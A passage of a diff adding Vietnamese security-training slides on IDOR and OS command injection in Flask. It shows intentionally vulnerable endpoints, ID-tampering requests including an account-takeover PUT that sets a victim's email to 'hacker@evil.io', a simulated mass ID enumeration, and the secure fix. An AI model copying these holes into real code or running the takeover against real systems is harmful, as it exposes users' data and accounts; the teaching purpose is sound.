+      <section class="slide flex-col justify-center min-h-[72vh]" data-slide="4" data-section="Phần 1: IDOR" data-theme="danger" data-title="IDOR — Soi chiếu Dòng Code Gây Lỗi">
+        <div class="mb-5">
+          <div class="text-xs font-bold uppercase tracking-wider text-red-400 mb-1">Phân tích Mã nguồn (White-box Analysis)</div>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">IDOR — Soi Chiếu Dòng Code Gây Lỗi (Python Flask)</h2>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
+          <!-- Left: Root Cause Explanation & Flow -->
+          <div class="lg:col-span-5 flex flex-col justify-between gap-4">
+            <!-- AuthN vs AuthZ comparison -->
+            <div class="bg-slate-800/90 border border-slate-700 rounded-2xl p-5 space-y-3.5">
+              <h3 class="text-sm font-bold uppercase tracking-wider text-slate-300 flex items-center gap-2">
+                <i data-lucide="git-compare" class="w-4 h-4 text-sky-400"></i>
+                Nhầm lẫn kinh điển của Lập trình viên
+              </h3>
+
+              <div class="p-3.5 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-start gap-3">
+                <i data-lucide="check-circle-2" class="w-5 h-5 text-emerald-400 shrink-0 mt-0.5"></i>
+                <div>
+                  <div class="text-sm font-bold text-emerald-300">Authentication (Đã kiểm tra)</div>
+                  <p class="text-xs text-slate-300 mt-0.5">Xác nhận <em>"Bạn là ai?"</em> — User Hải đã đăng nhập hợp lệ và có Cookie Session.</p>
+                </div>
+              </div>
+
+              <div class="p-3.5 rounded-xl bg-red-500/15 border border-red-500/45 flex items-start gap-3">
+                <i data-lucide="x-circle" class="w-5 h-5 text-red-400 shrink-0 mt-0.5"></i>
+                <div>
+                  <div class="text-sm font-bold text-red-300">Object-Level Authorization (BỊ BỎ QUA)</div>
+                  <p class="text-xs text-slate-200 mt-0.5">Không kiểm tra <em>"User Hải có quyền truy cập đối tượng ID=2 / File ID=3 hay không?"</em></p>
+                </div>
+              </div>
+            </div>
+
+            <!-- Visual Data Flow -->
+            <div class="bg-slate-800/90 border border-slate-700 rounded-2xl p-5">
+              <div class="text-xs font-bold uppercase tracking-wider text-slate-400 mb-3">Luồng thực thi lỗi trong hệ thống</div>
+              <div class="space-y-2 text-xs font-mono">
+                <div class="flex items-center gap-2.5 bg-slate-900 px-3 py-2 rounded-lg border border-slate-700">
+                  <span class="px-1.5 py-0.5 rounded bg-sky-500/20 text-sky-300 font-bold">1</span>
+                  <span>Session: <span class="text-emerald-300">user_id = 1</span></span>
+                  <span class="text-slate-500">|</span>
+                  <span>Body: <span class="text-red-400 font-bold">user_id = 2</span></span>
+                </div>
+                <div class="flex justify-center text-red-400"><i data-lucide="arrow-down" class="w-4 h-4"></i></div>
+                <div class="flex items-center gap-2.5 bg-red-500/15 px-3 py-2 rounded-lg border border-red-500/40 text-red-200">
+                  <span class="px-1.5 py-0.5 rounded bg-red-500 text-white font-bold">2</span>
+                  <span>SQL chỉ lọc <code class="font-bold">WHERE id = 2</code> (bỏ qua Session!)</span>
+                </div>
+                <div class="flex justify-center text-red-400"><i data-lucide="arrow-down" class="w-4 h-4"></i></div>
+                <div class="flex items-center gap-2.5 bg-slate-900 px-3 py-2 rounded-lg border border-red-500/40">
+                  <span class="px-1.5 py-0.5 rounded bg-red-500/30 text-red-300 font-bold">3</span>
+                  <span class="text-red-300 font-semibold">Trả nguyên JSON hồ sơ của nạn nhân #2!</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Right: Code Editor Window -->
+          <div class="lg:col-span-7 bg-[#0d1117] border border-slate-700 rounded-2xl overflow-hidden shadow-2xl flex flex-col">
+            <!-- Editor Header -->
+            <div class="bg-slate-900 px-4 py-2.5 border-b border-slate-700 flex items-center justify-between">
+              <div class="flex items-center gap-2">
+                <span class="w-3 h-3 rounded-full bg-red-500/80"></span>
+                <span class="w-3 h-3 rounded-full bg-amber-400/80"></span>
+                <span class="w-3 h-3 rounded-full bg-emerald-500/80"></span>
+                <span class="ml-2 px-2.5 py-0.5 rounded bg-slate-800 border border-slate-700 font-mono text-xs text-sky-300">app.py</span>
+                <span class="text-xs text-slate-500 font-mono">Python • Flask API</span>
+              </div>
+              <span class="px-2.5 py-0.5 rounded-full bg-red-500/20 border border-red-500/40 text-red-300 text-[11px] font-bold">VULNERABLE CODE</span>
+            </div>
+
+            <!-- Code Content -->
+            <div class="p-4 sm:p-5 font-mono text-xs sm:text-[13px] leading-6 overflow-x-auto flex-1 flex flex-col justify-between">
+              <!-- Endpoint 1: /api/profile -->
+              <div>
+                <div class="text-[11px] text-slate-500 uppercase tracking-wider mb-1.5 font-sans font-semibold">1. API Xem Hồ Sơ (/api/profile)</div>
+                <div class="space-y-0.5">
+                  <div class="flex gap-4 px-2"><span class="text-slate-600 select-none w-5 text-right">1</span><span><span class="tok-dec">@app.route</span>(<span class="tok-str">'/api/profile'</span>, methods=[<span class="tok-str">'POST'</span>])</span></div>
+                  <div class="flex gap-4 px-2"><span class="text-slate-600 select-none w-5 text-right">2</span><span><span class="tok-kw">def</span> <span class="tok-fn">get_profile</span>():</span></div>
+                  <div class="flex gap-4 px-2"><span class="text-slate-600 select-none w-5 text-right">3</span><span class="pl-4">target_id = request.json.get(<span class="tok-str">'user_id'</span>)</span></div>
+                  <div class="flex gap-4 px-2"><span class="text-slate-600 select-none w-5 text-right">4</span><span class="pl-4 tok-cmt"># [LỖ HỔNG IDOR]: Tin tưởng trực tiếp ID từ client gửi lên,</span></div>
+                  <div class="flex gap-4 px-2"><span class="text-slate-600 select-none w-5 text-right">5</span><span class="pl-4 tok-cmt"># thiếu bước kiểm tra đối chiếu với session['user_id']!</span></div>
+                  <!-- RED HIGHLIGHTED VULNERABLE LINE -->
+                  <div class="flex gap-4 px-2 py-1.5 my-1 bg-red-500/20 border-l-4 border-red-500 rounded-r-md">
+                    <span class="text-red-400 font-bold select-none w-5 text-right">6</span>
+                    <span class="pl-4 text-white font-semibold">user = db.execute(<span class="tok-str">"SELECT * FROM users WHERE id = ?"</span>, (target_id,)).fetchone()</span>
+                  </div>
+                  <div class="flex gap-4 px-2"><span class="text-slate-600 select-none w-5 text-right">7</span><span class="pl-4"><span class="tok-kw">return</span> jsonify(user)</span></div>
+                </div>
+
+                <!-- Annotation Callout pointing to Vulnerable Line -->
+                <div class="mt-2.5 ml-6 p-3 rounded-xl bg-red-500/15 border border-red-500/50 flex items-start gap-2.5 font-sans">
+                  <i data-lucide="alert-octagon" class="w-4 h-4 text-red-400 shrink-0 mt-0.5"></i>
+                  <p class="text-xs text-red-200 font-medium leading-relaxed">
+                    <strong class="text-white">Điểm chết tại dòng 6:</strong> <em>"Chỉ kiểm tra Authentication (đã đăng nhập), bỏ qua Object-Level Authorization (quyền sở hữu đối tượng)"</em>.
+                  </p>
+                </div>
+              </div>
+
+              <!-- Endpoint 2: /drive/download (compact) -->
+              <div class="mt-4 pt-3.5 border-t border-slate-800">
+                <div class="text-[11px] text-slate-500 uppercase tracking-wider mb-1.5 font-sans font-semibold">2. Tương tự tại API Tải Tài Liệu (/drive/download)</div>
+                <div class="space-y-0.5 text-xs">
+                  <div class="flex gap-4 px-2"><span class="text-slate-600 select-none w-5 text-right">12</span><span><span class="tok-dec">@app.route</span>(<span class="tok-str">'/drive/download'</span>)</span></div>
+                  <div class="flex gap-4 px-2"><span class="text-slate-600 select-none w-5 text-right">13</span><span><span class="tok-kw">def</span> <span class="tok-fn">download_file</span>():</span></div>
+                  <div class="flex gap-4 px-2"><span class="text-slate-600 select-none w-5 text-right">14</span><span class="pl-4">file_id = request.args.get(<span class="tok-str">'file_id'</span>)</span></div>
+                  <div class="flex gap-4 px-2 py-1 bg-red-500/20 border-l-4 border-red-500 rounded-r-md">
+                    <span class="text-red-400 font-bold select-none w-5 text-right">15</span>
+                    <span class="pl-4 text-white font-semibold">f = db.execute(<span class="tok-str">"SELECT path FROM files WHERE id = ?"</span>, (file_id,)).fetchone()</span>
+                  </div>
+                  <div class="flex gap-4 px-2"><span class="text-slate-600 select-none w-5 text-right">16</span><span class="pl-4"><span class="tok-kw">return</span> send_file(f[<span class="tok-str">'path'</span>])</span></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 5: IDOR - KỊCH BẢN TẤN CÔNG THỰC TẾ & BURP INTRUDER DEMO      -->
+      <!-- =================================================================== -->
+      <section class="slide flex-col justify-center min-h-[72vh]" data-slide="5" data-section="Phần 1: IDOR" data-theme="danger" data-title="IDOR — Kịch bản tấn công thực tế & Quy trình Demo">
+        <div class="mb-5">
+          <div class="text-xs font-bold uppercase tracking-wider text-red-400 mb-1">Exploitation Scenarios &amp; Demo</div>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">IDOR — Các Kịch Bản Tấn Công Thực Tế &amp; Càn Quét Hàng Loạt</h2>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
+          <!-- Left: 3 Attack Scenario Cards -->
+          <div class="lg:col-span-5 flex flex-col justify-between gap-3.5">
+            <!-- Card 1 -->
+            <div class="bg-slate-800/90 border border-slate-700 hover:border-red-500/50 rounded-2xl p-4 transition shadow-lg">
+              <div class="flex items-center justify-between mb-2">
+                <span class="flex items-center gap-2 text-sm font-bold text-white">
+                  <span class="w-6 h-6 rounded-md bg-red-500/20 text-red-400 flex items-center justify-center font-mono text-xs font-bold">1</span>
+                  Thao túng tham số URL (GET)
+                </span>
+                <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 text-sky-300 border border-slate-700">GET</span>
+              </div>
+              <p class="text-xs text-slate-300 leading-relaxed mb-2">
+                Thay đổi trực tiếp số ID tuần tự trên thanh địa chỉ để xem trộm hóa đơn, bảng lương, hợp đồng nội bộ của người dùng khác.
+              </p>
+              <div class="font-mono text-[11px] bg-slate-950 px-2.5 py-1.5 rounded border border-slate-800 text-slate-300">
+                GET /drive/download?file_id=<span class="text-red-400 font-bold">3</span>
+              </div>
+            </div>
+
+            <!-- Card 2 -->
+            <div class="bg-slate-800/90 border border-slate-700 hover:border-red-500/50 rounded-2xl p-4 transition shadow-lg">
+              <div class="flex items-center justify-between mb-2">
+                <span class="flex items-center gap-2 text-sm font-bold text-white">
+                  <span class="w-6 h-6 rounded-md bg-red-500/20 text-red-400 flex items-center justify-center font-mono text-xs font-bold">2</span>
+                  Thao túng JSON Body (POST/PUT)
+                </span>
+                <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 text-amber-300 border border-slate-700">POST / PUT</span>
+              </div>
+              <p class="text-xs text-slate-300 leading-relaxed mb-2">
+                Chặn gói tin API, sửa <code class="text-red-300">user_id</code> để đọc trộm hồ sơ cá nhân hoặc cập nhật email khôi phục → <strong class="text-red-300">Account Takeover</strong>.
+              </p>
+              <div class="font-mono text-[11px] bg-slate-950 px-2.5 py-1.5 rounded border border-slate-800 text-slate-300">
+                PUT /api/user/update → {"user_id": <span class="text-red-400 font-bold">2</span>, "email": "hacker@evil.io"}
+              </div>
+            </div>
+
+            <!-- Card 3 -->
+            <div class="bg-red-500/10 border border-red-500/45 rounded-2xl p-4 shadow-lg">
+              <div class="flex items-center justify-between mb-2">
+                <span class="flex items-center gap-2 text-sm font-bold text-white">
+                  <span class="w-6 h-6 rounded-md bg-red-500 text-white flex items-center justify-center font-mono text-xs font-bold">3</span>
+                  Càn quét hàng loạt (Mass Data Harvesting)
+                </span>
+                <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-red-500/25 text-red-200 border border-red-500/40">AUTOMATED</span>
+              </div>
+              <p class="text-xs text-slate-200 leading-relaxed">
+                Dùng <strong>Burp Suite Intruder</strong> cấu hình Payload <code class="text-amber-300">Numbers (1 → 30)</code> tự động bắn hàng loạt request để hút sạch toàn bộ CSDL trong vài giây.
+              </p>
+            </div>
+          </div>
+
+          <!-- Right: Burp Suite Intruder Simulation -->
+          <div class="lg:col-span-7 bg-[#0d1117] border border-slate-700 rounded-2xl overflow-hidden shadow-2xl flex flex-col">
+            <!-- Burp Header -->
+            <div class="bg-slate-900 px-4 py-2.5 border-b border-slate-700 flex flex-wrap items-center justify-between gap-2">
+              <div class="flex items-center gap-2.5">
+                <div class="w-6 h-6 rounded bg-orange-500/20 border border-orange-500/50 text-orange-400 flex items-center justify-center">
+                  <i data-lucide="radar" class="w-3.5 h-3.5"></i>
+                </div>
+                <span class="text-xs font-bold text-white">Burp Suite Intruder — Attack Results</span>
+                <span class="text-[11px] font-mono text-orange-300 bg-orange-500/15 px-2 py-0.5 rounded border border-orange-500/30">Numbers: 1 → 30</span>
+              </div>
+              <button onclick="runIntruderDemo()" id="btnIntruderReplay" class="px-3 py-1 rounded-md bg-red-500 hover:bg-red-600 text-white text-xs font-bold flex items-center gap-1.5 transition shadow">
+                <i data-lucide="play" class="w-3 h-3"></i> Start / Replay Scan
+              </button>
+            </div>
+
+            <!-- Target & Status Bar -->
+            <div class="px-4 py-2 bg-slate-950 border-b border-slate-800 flex flex-wrap items-center justify-between gap-2 font-mono text-[11px]">
+              <span class="text-slate-400">Target: <span class="text-sky-300">GET /drive/download?file_id=<span class="bg-orange-500/25 text-orange-300 px-1 rounded">§1§</span></span></span>
+              <span id="intruderStats" class="text-red-400 font-bold">30/30 Requests • 30 × 200 OK (100% Exposed)</span>
+            </div>
+
+            <!-- Intruder Table -->
+            <div class="flex-1 overflow-y-auto custom-scroll max-h-[340px]">
+              <table class="w-full text-left font-mono text-xs border-collapse">
+                <thead class="bg-slate-900/95 sticky top-0 text-[11px] text-slate-400 border-b border-slate-700">
+                  <tr>
+                    <th class="py-2 px-3">Req #</th>
+                    <th class="py-2 px-3">Payload (ID)</th>
+                    <th class="py-2 px-3">Status</th>
+                    <th class="py-2 px-3">Length</th>
+                    <th class="py-2 px-3">Extracted File / Data</th>
+                  </tr>
+                </thead>
+                <tbody id="intruderTableBody" class="divide-y divide-slate-800/80 text-slate-300">
+                  <!-- Populated dynamically by JS on load (ID 1..30) -->
+                </tbody>
+              </table>
+            </div>
+
+            <!-- Footer Progress -->
+            <div class="px-4 py-2.5 bg-slate-900 border-t border-slate-800 flex items-center justify-between text-xs">
+              <div class="flex items-center gap-2 text-red-300">
+                <i data-lucide="alert-triangle" class="w-4 h-4 text-red-400"></i>
+                <span class="font-medium">Toàn bộ 30 tài liệu nhạy cảm bị trích xuất không cần đặc quyền Admin!</span>
+              </div>
+              <div class="w-28 bg-slate-800 h-2 rounded-full overflow-hidden">
+                <div id="intruderProgress" class="bg-red-500 h-full transition-all duration-300" style="width: 100%;"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 6: IDOR - GIẢI PHÁP PHÒNG CHỐNG & CODE AN TOÀN                -->
+      <!-- =================================================================== -->
+      <section class="slide flex-col justify-center min-h-[72vh]" data-slide="6" data-section="Phần 1: IDOR • Phòng thủ" data-theme="safe" data-title="IDOR — Giải pháp Phòng chống & Code An Toàn">
+        <div class="mb-4">
+          <div class="text-xs font-bold uppercase tracking-wider text-emerald-400 mb-1">Secure Coding &amp; Mitigation</div>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">IDOR — Đối Chiếu Code Lỗi &amp; Giải Pháp Phòng Thủ Chuẩn</h2>
+        </div>
+
+        <!-- Before vs After Code Comparison -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-5 mb-5">
+          <!-- BEFORE: VULNERABLE -->
+          <div class="bg-[#0d1117] border border-red-500/45 rounded-2xl overflow-hidden shadow-xl flex flex-col">
+            <div class="bg-red-500/15 px-4 py-2.5 border-b border-red-500/35 flex items-center justify-between">
+              <div class="flex items-center gap-2 text-red-300 font-bold text-xs uppercase tracking-wide">
+                <i data-lucide="x-octagon" class="w-4 h-4"></i> BEFORE — Code Lỗi (Vulnerable)
+              </div>
+              <span class="font-mono text-[11px] text-red-300">Thiếu kiểm tra chủ sở hữu</span>
+            </div>
+            <div class="p-4 font-mono text-xs leading-6 overflow-x-auto flex-1">
+              <div><span class="tok-dec">@app.route</span>(<span class="tok-str">'/drive/download'</span>)</div>
+              <div><span class="tok-kw">def</span> <span class="tok-fn">download_file</span>():</div>
+              <div class="pl-4">file_id = request.args.get(<span class="tok-str">'file_id'</span>) <span class="tok-cmt"># Số tự tăng: 1, 2, 3</span></div>
+              <div class="pl-4 my-1 py-1 px-2 bg-red-500/20 border-l-4 border-red-500 rounded-r text-red-100 font-semibold">
+                row = db.execute(<span class="tok-str">"SELECT * FROM files WHERE id = ?"</span>, (file_id,)).fetchone()
+              </div>
+              <div class="pl-4"><span class="tok-kw">return</span> send_file(row[<span class="tok-str">'path'</span>])</div>
+              <div class="mt-3 pt-2.5 border-t border-slate-800 text-[11px] text-red-300 font-sans flex items-center gap-1.5">
+                <i data-lucide="alert-circle" class="w-3.5 h-3.5 shrink-0"></i>
+                Tin tưởng mù quáng vào tham số Client → Dễ dàng đoán ID &amp; tải trộm.
+              </div>
+            </div>
+          </div>
+
+          <!-- AFTER: SECURE -->
+          <div class="bg-[#0d1117] border border-emerald-500/55 rounded-2xl overflow-hidden shadow-xl glow-safe flex flex-col">
+            <div class="bg-emerald-500/15 px-4 py-2.5 border-b border-emerald-500/35 flex items-center justify-between">
+              <div class="flex items-center gap-2 text-emerald-300 font-bold text-xs uppercase tracking-wide">
+                <i data-lucide="shield-check" class="w-4 h-4"></i> AFTER — Code An Toàn (Secure)
+              </div>
+              <span class="font-mono text-[11px] text-emerald-300">Complete Mediation + UUIDv4</span>
+            </div>
+            <div class="p-4 font-mono text-xs leading-6 overflow-x-auto flex-1">
+              <div><span class="tok-dec">@app.route</span>(<span class="tok-str">'/drive/download'</span>)</div>
+              <div><span class="tok-kw">def</span> <span class="tok-fn">download_file</span>():</div>
+              <div class="pl-4">file_uuid = request.args.get(<span class="tok-str">'uuid'</span>)</div>
+              <div class="pl-4">owner_id = session[<span class="tok-str">'user_id'</span>] <span class="tok-cmt"># Lấy từ Session Server!</span></div>
+              <div class="pl-4 my-1 py-1 px-2 bg-emerald-500/20 border-l-4 border-emerald-400 rounded-r text-emerald-100 font-semibold">
+                row = db.execute(<span class="tok-str">"SELECT * FROM files WHERE uuid = ? AND owner_id = ?"</span>, (file_uuid, owner_id)).fetchone()
+              </div>
+              <div class="pl-4"><span class="tok-kw">if not</span> row:</div>
+              <div class="pl-8 text-emerald-300">audit_log.warning(<span class="tok-str">f"IDOR blocked: user={owner_id}"</span>)</div>
+              <div class="pl-8 text-emerald-300"><span class="tok-kw">return</span> abort(<span class="tok-num">403</span>) <span class="tok-cmt"># Forbidden</span></div>
+              <div class="pl-4"><span class="tok-kw">return</span> send_file(row[<span class="tok-str">'path'</span>])</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3 Core Mitigation Pillars -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+          <div class="bg-slate-800/90 border border-emerald-500/35 rounded-xl p-4">
+            <div class="flex items-center gap-2.5 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-emerald-500/15 text-emerald-400 flex items-center justify-center"><i data-lucide="key-round" class="w-4 h-4"></i></div>
+              <h4 class="text-sm font-bold text-white">1. Complete Mediation</h4>
+            </div>
+            <p class="text-xs text-slate-300 leading-relaxed">
+              Mọi truy vấn đều ràng buộc quyền sở hữu từ Session phía Server: <code class="text-emerald-300 bg-slate-900 px-1 py-0.5 rounded">WHERE id = ? AND owner_id = session['user_id']</code>.
+            </p>
+          </div>
+
+          <div class="bg-slate-800/90 border border-emerald-500/35 rounded-xl p-4">
+            <div class="flex items-center gap-2.5 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-emerald-500/15 text-emerald-400 flex items-center justify-center"><i data-lucide="shuffle" class="w-4 h-4"></i></div>
+              <h4 class="text-sm font-bold text-white">2. Dùng UUIDv4 ngẫu nhiên</h4>
+            </div>
+            <p class="text-xs text-slate-300 leading-relaxed">
+              Thay ID tự tăng <code class="text-red-300">1, 2, 3</code> bằng UUIDv4 (<code class="text-emerald-300">550e8400-e29b...</code>) giúp chống càn quét tự động (Defense-in-Depth).
+            </p>
+          </div>
+
+          <div class="bg-slate-800/90 border border-emerald-500/35 rounded-xl p-4">
+            <div class="flex items-center gap-2.5 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-emerald-500/15 text-emerald-400 flex items-center justify-center"><i data-lucide="file-search" class="w-4 h-4"></i></div>
+              <h4 class="text-sm font-bold text-white">3. Audit Log &amp; 403 Forbidden</h4>
+            </div>
+            <p class="text-xs text-slate-300 leading-relaxed">
+              Chặn ngay bằng mã <code class="text-emerald-300 font-bold">403 Forbidden</code> và ghi <strong>Security Audit Log</strong> để SOC/SIEM phát hiện sớm hành vi dò quét.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 7: PHẦN 2 - OS COMMAND INJECTION & OWASP TOP 10:2025          -->
+      <!-- =================================================================== -->
+      <section class="slide flex-col justify-center min-h-[72vh]" data-slide="7" data-section="Phần 2: Command Injection" data-theme="danger" data-title="OS Command Injection & Vị trí trên OWASP Top 10:2025">
+        <div class="mb-5">
+          <div class="inline-flex items-center gap-2 text-xs font-bold uppercase tracking-wider text-red-400 mb-1">
+            <i data-lucide="terminal-square" class="w-4 h-4"></i> Phần 2 — OS Command Injection
+          </div>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">OS Command Injection &amp; Vị Trí Top 5 OWASP 2025</h2>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
+          <!-- Left: RCE & CIA Destruction -->
+          <div class="lg:col-span-6 flex flex-col justify-between gap-4">
+            <div class="bg-slate-800/90 border border-slate-700 rounded-2xl p-5">
+              <div class="flex items-center gap-2.5 mb-2">
+                <span class="px-2.5 py-0.5 rounded bg-red-500/20 border border-red-500/40 text-red-300 font-mono text-xs font-bold">A05:2025</span>
+                <h3 class="text-base font-bold text-white">Injection — Chèn Lệnh Hệ Điều Hành</h3>
+              </div>
+              <p class="text-sm text-slate-300 leading-relaxed">
+                Phát sinh khi ứng dụng ghép trực tiếp dữ liệu người dùng chưa lọc vào chuỗi lệnh gửi cho OS Shell (<code class="text-amber-300 bg-slate-900 px-1.5 py-0.5 rounded">cmd.exe</code>, <code class="text-amber-300 bg-slate-900 px-1.5 py-0.5 rounded">/bin/sh</code>), cho phép kẻ tấn công thực thi lệnh tùy ý trên máy chủ.
+              </p>
+            </div>
+
+            <!-- CRITICAL RCE ALERT -->
+            <div class="glow-danger bg-gradient-to-br from-red-950/80 via-slate-900 to-slate-900 border-2 border-red-500 rounded-2xl p-5 space-y-4">
+              <div class="flex items-center justify-between">
+                <div class="flex items-center gap-2.5">
+                  <div class="w-10 h-10 rounded-xl bg-red-500 text-white flex items-center justify-center shadow-lg">
+                    <i data-lucide="skull" class="w-5 h-5"></i>
+                  </div>
+                  <div>
+                    <div class="text-xs uppercase tracking-wider text-red-300 font-bold">Mức độ tác động tối đa</div>
+                    <div class="text-lg font-extrabold text-white">RCE — Remote Code Execution</div>
+                  </div>
+                </div>
+                <span class="px-2.5 py-1 rounded bg-red-600 text-white font-mono text-xs font-extrabold">CVSS 9.8+</span>
+              </div>
+
+              <div class="text-xs font-semibold text-red-200">Phá hủy hoàn toàn cả 3 trụ cột của Tam giác CIA:</div>
+
+              <div class="grid grid-cols-3 gap-2.5">
+                <div class="bg-slate-950/90 border border-red-500/40 rounded-xl p-3 text-center">
+                  <div class="text-red-400 font-extrabold text-sm mb-1">C — Bí mật</div>
+                  <p class="text-[11px] text-slate-300">Đọc mọi file mật, mã nguồn, khóa API &amp; CSDL.</p>
+                </div>
+                <div class="bg-slate-950/90 border border-red-500/40 rounded-xl p-3 text-center">
+                  <div class="text-red-400 font-extrabold text-sm mb-1">I — Toàn vẹn</div>
+                  <p class="text-[11px] text-slate-300">Chỉnh sửa hệ thống, cấy mã độc &amp; cửa hậu.</p>
+                </div>
+                <div class="bg-slate-950/90 border border-red-500/40 rounded-xl p-3 text-center">
+                  <div class="text-red-400 font-extrabold text-sm mb-1">A — Sẵn sàng</div>
+                  <p class="text-[11px] text-slate-300">Xóa dữ liệu, mã hóa Ransomware, tắt server.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Right: OWASP Top 10:2025 Highlighting #5 -->
+          <div class="lg:col-span-6 bg-slate-800/90 border border-slate-700 rounded-2xl p-5 flex flex-col justify-between shadow-2xl">
+            <div class="flex items-center justify-between pb-3 mb-3 border-b border-slate-700">
+              <div class="flex items-center gap-2">
+                <i data-lucide="bar-chart-3" class="w-5 h-5 text-red-400"></i>
+                <span class="font-bold text-sm text-white uppercase tracking-wide">Bảng xếp hạng OWASP Top 10:2025</span>
+              </div>
+              <span class="text-[11px] font-mono px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40">FOCUS: #5</span>
+            </div>
+
+            <div class="space-y-2.5 flex-1">
+              <div class="bg-slate-900/70 border border-slate-700/70 rounded-lg px-3.5 py-2 flex items-center justify-between opacity-75">
+                <div class="flex items-center gap-3">
+                  <span class="font-mono text-xs font-bold text-sky-400/80 w-6">#1</span>
+                  <span class="text-xs sm:text-sm text-slate-300 font-medium">A01:2025 – Broken Access Control <span class="text-[11px] text-slate-500 ml-1">(Phần 1)</span></span>
+                </div>
+                <div class="w-24 bg-slate-800 h-1.5 rounded-full overflow-hidden"><div class="bg-slate-500 h-full" style="width: 96%;"></div></div>
+              </div>
+
+              <div class="bg-slate-900/70 border border-slate-700/70 rounded-lg px-3.5 py-2 flex items-center justify-between opacity-65">
+                <div class="flex items-center gap-3">
+                  <span class="font-mono text-xs font-bold text-slate-400 w-6">#2</span>
+                  <span class="text-xs sm:text-sm text-slate-300 font-medium">A02:2025 – Security Misconfiguration</span>
+                </div>
+                <div class="w-24 bg-slate-800 h-1.5 rounded-full overflow-hidden"><div class="bg-slate-600 h-full" style="width: 78%;"></div></div>
+              </div>
+
+              <div class="bg-slate-900/70 border border-slate-700/70 rounded-lg px-3.5 py-2 flex items-center justify-between opacity-60">
+                <div class="flex items-center gap-3">
+                  <span class="font-mono text-xs font-bold text-slate-400 w-6">#3</span>
+                  <span class="text-xs sm:text-sm text-slate-300 font-medium">A03:2025 – Software Supply Chain Failures</span>
+                </div>
+                <div class="w-24 bg-slate-800 h-1.5 rounded-full overflow-hidden"><div class="bg-slate-600 h-full" style="width: 70%;"></div></div>
+              </div>
+
+              <div class="bg-slate-900/70 border border-slate-700/70 rounded-lg px-3.5 py-2 flex items-center justify-between opacity-60">
+                <div class="flex items-center gap-3">
+                  <span class="font-mono text-xs font-bold text-slate-400 w-6">#4</span>
+                  <span class="text-xs sm:text-sm text-slate-300 font-medium">A04:2025 – Cryptographic Failures</span>
+                </div>
+                <div class="w-24 bg-slate-800 h-1.5 rounded-full overflow-hidden"><div class="bg-slate-600 h-full" style="width: 64%;"></div></div>
+              </div>
+
+              <!-- #5 HIGHLIGHTED -->
+              <div class="glow-danger bg-gradient-to-r from-red-500/25 via-red-500/15 to-slate-900 border-2 border-red-500 rounded-xl p-3.5">
+                <div class="flex items-center justify-between gap-2">
+                  <div class="flex items-center gap-3">
+                    <div class="w-9 h-9 rounded-lg bg-red-500 text-white font-extrabold flex items-center justify-center text-base shadow-lg shrink-0">#5</div>
+                    <div>
+                      <div class="text-sm sm:text-base font-extrabold text-white">A05:2025 – Injection</div>
+                      <div class="text-xs text-red-200 font-medium mt-0.5">OS Command Injection, SQLi, LDAP, XSS</div>
+                    </div>
+                  </div>
+                  <span class="px-2.5 py-1 rounded-full bg-red-600 text-white text-[11px] font-extrabold uppercase tracking-wider shrink-0">TOP 5 • RCE</span>
+                </div>
+                <div class="mt-2.5 w-full bg-slate-900/90 rounded-full h-2 overflow-hidden">
+                  <div class="bg-gradient-to-r from-red-500 to-amber-400 h-full rounded-full" style="width: 82%;"></div>
+                </div>
+              </div>
+
+              <div class="bg-slate-900/50 border border-slate-800 rounded-lg px-3.5 py-2 flex items-center justify-between opacity-50">
+                <div class="flex items-center gap-3">
+                  <span class="font-mono text-xs text-slate-500 w-6">#6–10</span>
+                  <span class="text-xs text-slate-400">Insecure Design, Auth Failures, Software Integrity, Logging...</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="mt-3 pt-3 border-t border-slate-700/80 flex items-center justify-between text-xs text-slate-400">
+              <span>Tần suất thấp hơn IDOR</span>
+              <span class="text-red-400 font-bold">Nhưng 1 lỗi đủ mất toàn bộ Server!</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 8: COMMAND INJECTION - CODE LỖI & GIẢI PHẪU LUỒNG SHELL       -->
+      <!-- =================================================================== -->
+      <section class="slide flex-col justify-center min-h-[72vh]" data-slide="8" data-section="Phần 2: Command Injection" data-theme="danger" data-title="Command Injection — Code Lỗi & Luồng Thực Thi Shell">
+        <div class="mb-5">
+          <div class="text-xs font-bold uppercase tracking-wider text-red-400 mb-1">Cơ chế phát sinh &amp; Giải phẫu hệ điều hành</div>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Command Injection — Dòng Code Lỗi &amp; Luồng Thực Thi Shell</h2>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
+          <!-- Left: Python Flask Vulnerable Code Editor -->
+          <div class="lg:col-span-6 bg-[#0d1117] border border-slate-700 rounded-2xl overflow-hidden shadow-2xl flex flex-col">
+            <div class="bg-slate-900 px-4 py-2.5 border-b border-slate-700 flex items-center justify-between">
+              <div class="flex items-center gap-2">
+                <span class="w-3 h-3 rounded-full bg-red-500/80"></span>
